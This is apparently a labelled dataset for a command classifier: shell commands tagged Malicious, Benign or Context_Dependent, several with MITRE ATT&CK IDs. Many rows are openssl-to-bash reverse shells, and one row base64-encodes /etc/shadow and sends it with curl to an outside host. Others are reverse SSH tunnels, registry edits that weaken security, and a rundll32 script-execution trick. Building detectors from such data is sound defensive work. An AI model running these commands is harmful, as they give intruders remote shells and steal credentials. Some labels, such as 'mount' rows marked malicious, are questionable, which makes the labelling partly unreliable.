command,label,original_label,mitre_id
base64 /etc/shadow | curl -d @- http://10.0.0.1/exfil,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
3d-ascii-viewer --color path/to/model.obj,Benign,Benign,Benign
SafeEjectGPU Eject,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
rake task,Benign,Benign,Benign
stl2gts < path/to/file.stl > path/to/file.gts,Benign,Benign,Benign
ppmtoicr path/to/file.ppm > path/to/file.icr,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
"), globing (",Malicious,Malicious,T1027
systemctl soft-reboot [-f|--force],Benign,Benign,Benign
amass enum -o output_file -dir path/to/directory -d domain_name,Benign,Benign,Benign
clang-tidy -checks=* -list-checks,Benign,Benign,Benign
find /some/path -type f ! -perm -111 -ls,Benign,Benign,Benign
asciidoctor [-e|--embedded] path/to/file.adoc,Benign,Benign,Benign
patch.dll,Malicious,Malicious,T1036
openssl s_client -quiet -connect 172.16.0.10:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
bluebuild build path/to/recipe.yml,Benign,Benign,Benign
ping -c 4 lb-01,Benign,Synthetic,Synthetic
mlr --icsv --opprint cat example.csv,Benign,Benign,Benign
ssh -L 8080:localhost:80 root@172.16.5.20,Context_Dependent,Synthetic,Synthetic
weechat --no-script,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:1433 operator@10.0.0.8,Context_Dependent,Synthetic,Synthetic
pulumi console [-h|--help],Benign,Benign,Benign
mux -o output_muxer_name,Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f",Malicious,Malicious,T1112
meshlabserver -i input.stl -o output.obj,Benign,Benign,Benign
solo key update,Benign,Benign,Benign
colordiff -w file1 file2,Benign,Benign,Benign
rm -f *.pdf,Benign,Benign,Benign
"depotdownloader -app 108600 -depot 108603 -username ""gabecube"" -remember-password",Benign,Benign,Benign
ssh -L 8080:localhost:9090 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"tmux new-session -s vims -n vim0 -d ""vim foo""",Benign,Benign,Benign
ssh -R 8080:localhost:445 support@192.168.0.50,Context_Dependent,Synthetic,Synthetic
"ani-cli [-d|--download] [-r|--range] ""1 6"" ""anime_title""",Benign,Benign,Benign
plasma-apply-desktoptheme --list-themes,Benign,Benign,Benign
who -b,Benign,Synthetic,Synthetic
o [-m|-monitor] path/to/file,Benign,Benign,Benign
ed [-q|--quiet] [-s|--script],Benign,Benign,Benign
"echo ""$b"" | grep --only-matching ""[$a]"" | xargs | tr --delete ' '",Benign,Benign,Benign
snakefmt --diff path/to/snakefile,Benign,Benign,Benign
ss-local -s host -p server_port -l local port -k password -m encrypt_method,Context_Dependent,Benign,Benign
bitcoind -daemon,Benign,Benign,Benign
"source ""`brew --prefix`/etc/grc.bashrc""",Benign,Benign,Benign
manim --list_scenes path/to/file.py,Benign,Benign,Benign
infection --log-verbosity default|all|none,Benign,Benign,Benign
skopeo inspect docker://registry_hostname/image:tag,Benign,Benign,Benign
"arguments_source | xargs sh -c ""command1 && command2 | command3""",Benign,Benign,Benign
replace path\to\file_or_directory path\to\destination_directory /s,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
"find . -name ""*.bash"" |xargs grep ""echo""",Benign,Benign,Benign
yadm --yadm-repo,Benign,Benign,Benign
memray flamegraph path/to/file.bin,Benign,Benign,Benign
ssh -R 4444:localhost:22 jenkins@10.0.0.50,Context_Dependent,Synthetic,Synthetic
thunderbird -P profile_name,Benign,Benign,Benign
"find . -name ""articles.jpg""",Benign,Benign,Benign
ssh -R 8080:localhost:22 admin@10.0.0.10,Context_Dependent,Synthetic,Synthetic
yay -Ss keyword,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:80 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
find . -daystart -ctime 4 -ls -type f,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"find . -name "".txt"" | grep a",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
cat path/to/urls.txt | cariddi -intensive -proxy http://127.0.0.1:8080 -rua -oh path/to/intensive_crawl.html,Benign,Benign,Benign
script [-h|--help],Benign,Benign,Benign
podman pull [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:6379 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
find . -name config -type d,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
sails lift,Benign,Benign,Benign
dzdo -v,Benign,Benign,Benign
tar -czf backup.tar.gz /home/user/data,Benign,Synthetic,Synthetic
ssh -R 8080:localhost:22 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
birdc show route for fd00:/8 all,Benign,Benign,Benign
"find ~ -name ""*.txt"" -print",Benign,Benign,Benign
systemctl unset-environment var,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
"echo -e ""length(FOO_NO_LEAD_SPACE)==$(echo -ne ""${FOO_NO_LEAD_SPACE}"" | wc -m)""",Benign,Benign,Benign
lt [-p|--port] 8000 [-s|--subdomain] subdomain,Benign,Benign,Benign
pip install typescript,Benign,Synthetic,Synthetic
gvgen -?,Benign,Benign,Benign
carthage bootstrap,Benign,Benign,Benign
"find . -name ""*.py"" -exec wc -l {} \; | awk '{ SUM += $0} END { print SUM }'",Benign,Benign,Benign
ssh -R 8080:localhost:9001 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:9090 admin@10.0.0.8,Context_Dependent,Synthetic,Synthetic
pacinfo --version,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
pic /path/to/input-file,Context_Dependent,Malicious,T1005
chown -R deploy:deploy /opt/app,Benign,Synthetic,Synthetic
qsub -l walltime=1:2:3 script.sh,Benign,Benign,Benign
ssh -R 4444:localhost:4444 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
rbenv install --list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
find /usr/bin -type f -atime +100,Benign,Benign,Benign
ssh -R 4444:localhost:1433 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:3306 jenkins@10.0.0.1,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:993 support@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
"find ~/container -mindepth 3 -type f -execdir mv ""{}"" $(dirname ""{}"")/.. \;",Benign,Benign,Benign
dog [-q|--query] example.com [-t|--type] MX [-n|--nameserver] 1.1.1.1 [-T|--tcp],Benign,Benign,Benign
sudo repquota [-augs|--all --user --group --human-readable],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
apropos postscript | grep -i png,Benign,Benign,Benign
pkgin full-upgrade,Benign,Benign,Benign
ganache-cli,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
lsblk [-b|--bytes],Benign,Benign,Benign
caffeinate -d,Benign,Benign,Benign
tomb lock encrypted_directory.tomb -k encrypted_directory.tomb.key,Benign,Benign,Benign
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",Malicious,Malicious,T1218
mk -k,Benign,Benign,Benign
"find /home -type f -name ""*.ext"" -print0 | while read -r -d ""$(printf ""\000"")"" -r path; do awk '{ sub(""\r$"", """"); print }' $path > $path""_new""; done",Context_Dependent,Benign,Benign
nagios2 -v,Benign,Benign,Benign
hub sync,Benign,Benign,Benign
chroma [-l|--lexer] python path/to/source_file.py,Benign,Benign,Benign
ls -la /home/deploy,Benign,Synthetic,Synthetic
hurl path/to/file.hurl,Benign,Benign,Benign
az storage blob delete --account-name account_name --account-key account_key [-c|--container-name] container_name [-n|--name] blob_name,Benign,Benign,Benign
sudo cu [-l|--line] /dev/ttyXYZ [-s|--speed] 115200 --parity=even|odd|none [-f|--nortscts] --nostop,Benign,Benign,Benign
gnatmake -f source_file.adb,Benign,Benign,Benign
stow [-R|--restow] [-t|--target] path/to/target_directory path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
zfs snapshot pool_name/filesystem_name@snapshot_name,Benign,Benign,Benign
maestral status,Benign,Benign,Benign
sudo btrfs [su|subvolume] [sh|show] path/to/subvolume,Benign,Benign,Benign
"{if($user.$prop -like ""*password*"")",Malicious,Malicious,T1552
xctool -workspace YourWorkspace.xcworkspace -scheme YourScheme build,Benign,Benign,Benign
touch $target_file_path,Malicious,Malicious,T1070
find /etc -newer /etc/motd,Benign,Benign,Benign
"ssh someone@somehost ""cd /export/home/someone && find . -name '*' -print | parallel -j1 'sleep 10;curl -u someone:password ftp://somehost/tmp/ -vT'",Benign,Benign,Benign
dotnet tool restore,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
nitrogen --restore,Benign,Benign,Benign
ssh -R 8080:localhost:80 jenkins@172.16.0.10,Context_Dependent,Synthetic,Synthetic
pamflip [-r|-rotate]90|180|270 path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
pngtopam [-te|-text] path/to/file.txt path/to/image.png > path/to/output.pam,Benign,Benign,Benign
ssh -L 8080:localhost:80 support@192.168.0.50,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 backup@192.168.0.5,Context_Dependent,Synthetic,Synthetic
NtWriteVirtualMemory,Malicious,Malicious,T1055
find / -iname '*.ogg',Context_Dependent,Benign,Benign
"socat TCP-LISTEN:6666,fork -",Context_Dependent,Synthetic,Synthetic
type ls,Benign,Synthetic,Synthetic
if (-Not (Test-Path -Path $folderPath)) {,Malicious,Malicious,T1105
ansible-inventory --list,Benign,Benign,Benign
ssh -R 4444:localhost:53 support@10.20.30.40,Context_Dependent,Synthetic,Synthetic
sudo a2enmod module,Benign,Benign,Benign
"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;",Context_Dependent,Malicious,T1016
poetry show,Benign,Benign,Benign
sysctl kernel.hostname,Benign,Synthetic,Synthetic
sudo lvrename [-y|--yes] /dev/vg_name/old_lv /dev/vg_name/new_lv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:995 jenkins@10.0.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@192.168.1.10,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:5432 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
autoexpect -f path/to/file command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
mkdir ~/practice,Benign,Benign,Benign
"frida-trace [-i|--include] ""function_name"" process_name",Benign,Benign,Benign
"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}.*${string2}.*${string3}""",Benign,Benign,Benign
tldr chromium,Benign,Benign,Benign
find /DIR -type f -print0 | tr -dc '\0' | wc -c,Benign,Benign,Benign
ctags -f path/to/file *,Benign,Benign,Benign
"find . -type d -empty -exec rmdir ""{}"" \;",Benign,Benign,Benign
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",Malicious,Malicious,T1546
ssh -R 8080:localhost:8443 deploy@172.20.10.8,Context_Dependent,Synthetic,Synthetic
find /var/www/html/zip/data/*/*/*/*/* -type f -mtime +90,Benign,Benign,Benign
gunzip -l file.zip,Benign,Benign,Benign
ssh -R 8080:localhost:993 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
"seq 1 10 | perl -e '@x=("""")x3;while(<>){print shift @x;push @x,$_}'",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
xteddy -float,Benign,Benign,Benign
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,Malicious,Malicious,T1112
"find /data/ -name 'command-*-setup' | sort -t - -V -k 2,2",Benign,Benign,Benign
mamba list,Benign,Benign,Benign
kiwi-ng result list --target-dir=path/to/directory,Benign,Benign,Benign
xrdb,Benign,Benign,Benign
mount,Benign,Synthetic,Synthetic
aws workmail list-users --organization-id organization_id,Benign,Benign,Benign
evince [-s|--presentation] path/to/file.pdf,Benign,Benign,Benign
nu path/to/script.nu,Benign,Benign,Benign
bpython [-i|--interactive] path/to/file.py,Benign,Benign,Benign
redis-server --loglevel warning|notice|verbose|debug,Benign,Benign,Benign
ssh -R 4444:localhost:8080 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
mdatopbm -i path/to/image.mda > path/to/output.pbm,Benign,Benign,Benign
rip [-u|--unbury],Benign,Benign,Benign
dcgmi discovery [-l|--list],Benign,Benign,Benign
ssh -R 8080:localhost:22 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
"fd ""string|regex""",Benign,Benign,Benign
prompt,Benign,Benign,Benign
pw-mon [-h|--help],Benign,Benign,Benign
coproc name { while read line; do command1; command2; ...; done },Benign,Benign,Benign
reg.exe,Malicious,Malicious,T1003
Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null,Malicious,Malicious,T1484
luanti --quiet,Benign,Benign,Benign
grep -ri 'secret' /home/,Context_Dependent,Synthetic,Synthetic
ulimit -S -n,Benign,Benign,Benign
ssh -R 8080:localhost:1433 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
assoc,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
mv /var/www/Dockerfile.old /var/www/Dockerfile,Benign,Synthetic,Synthetic
ssh -R 4444:localhost:3389 support@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
pkginfo [-i|--installed],Benign,Benign,Benign
copilot --resume,Benign,Benign,Benign
"find ""$dir"" -mindepth 1 -type f",Benign,Benign,Benign
find . -name “*.jpg”,Benign,Benign,Benign
sudo chmod +rx $(which node),Benign,Benign,Benign
nuclei [-rl|-rate-limit] 150 [-bs|-bulk-size] 25 [-c|-concurrency] 25 -silent [-u|-target] https://example.com,Benign,Benign,Benign
git commit [-m|--message] message_text,Benign,Benign,Benign
"find / -iname ""filename""",Context_Dependent,Benign,Benign
megatools-dl --limit-speed speed https://mega.nz/...,Benign,Benign,Benign
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe",Malicious,Malicious,T1547
nmap -sV 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
systemctl status haproxy,Benign,Synthetic,Synthetic
"echo ""setting_value"" | elasticsearch-keystore add --stdin setting_name",Benign,Benign,Benign
mariadb < path/to/script.sql db_name > path/to/output.tab,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:53 operator@192.168.1.25,Context_Dependent,Synthetic,Synthetic
gops memstats pid|addr,Benign,Benign,Benign
wtype -m ctrl,Benign,Benign,Benign
ego query bug package,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
dokku apps:create app_name,Benign,Benign,Benign
checkupdates [-c|--change],Benign,Benign,Benign
cups-config --version,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
git gc,Benign,Benign,Benign
env variable1=value variable2=value variable3=value ... program,Benign,Benign,Benign
mako --default-timeout 2000,Benign,Benign,Benign
"find /home/musicuser/Music/ -type f -iname ""*$1*"" -iname ""*$2*"" -exec mplayer {} \;",Context_Dependent,Benign,Benign
yum check-update | awk 'p; /Updated packages/ {p=1}',Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
virtualboxvm --startvm name|uuid --dvd path\to\image_file,Benign,Benign,Benign
ssh -R 4444:localhost:53 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;,Malicious,Malicious,T1543
tldr code,Benign,Benign,Benign
datashader_cli points path/to/input_data.geo.parquet path/to/output_data.png --geo true --matplotlib true,Benign,Benign,Benign
pwgen [-s|--secure],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 backup@172.16.0.10,Context_Dependent,Synthetic,Synthetic
mmcli --modem=modem,Benign,Benign,Benign
nano [-S|--softwrap] path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
lsattr -d,Benign,Benign,Benign
lsd [-ltr|--long --timesort --reverse],Benign,Benign,Benign
"find . -name ""*.txt"" -print0 | xargs -0 rm",Benign,Benign,Benign
mypy [-p|--package] package_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
gdbus monitor --session,Benign,Benign,Benign
ssh -R 4444:localhost:22 audit@update.bad,Context_Dependent,Synthetic,Synthetic
WriteProcessMemory(),Malicious,Malicious,T1574
csvsql path/to/data.csv,Benign,Benign,Benign
tshark -Xlua_script:/path/to/temp-file,Malicious,Malicious,T1548
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
find . -name '*.csv.gz' -exec gzip -d {} \;,Benign,Benign,Benign
ssh -L 8080:localhost:8443 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
cd $test_folder; touch a b c d e f g,Malicious,Malicious,T1560
openssl s_client -quiet -connect 172.16.0.10:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
tunnel upload path/to/file table_name -fd field_delim -rd record_delim;,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
"cd ""`xsel`""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:445 backup@192.168.1.10,Context_Dependent,Synthetic,Synthetic
elasticsearch-create-enrollment-token [-s|--scope] node --verbose,Benign,Benign,Benign
s3cmd mv s3://src_bucket/src_object s3://dst_bucket/dst_object,Benign,Benign,Benign
flashrom [-p|--programmer] programmer,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
disown -h %job_number,Benign,Benign,Benign
kubectl get secrets --all-namespaces,Malicious,Malicious,T1552
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"find ./js/ -type f -name ""*.js"" | xargs rm -f",Benign,Benign,Benign
ssh -L 8080:localhost:80 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
networkctl up interface1 interface2 ...,Benign,Benign,Benign
float variable_name=value,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
gh search code keyword1 keyword2 ...,Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
find . -inum 968746 -exec rm -i {} \;,Benign,Benign,Benign
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,Malicious,Malicious,T1127
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
monodis --method path/to/assembly.exe,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
dropdb database_name,Benign,Benign,Benign
ssh -R 8080:localhost:110 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 postgres@192.168.1.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:1433 audit@192.168.1.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
urpmi.update medium1 medium2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
mount /dev/sda1 /mnt/,Malicious,Malicious,T1059
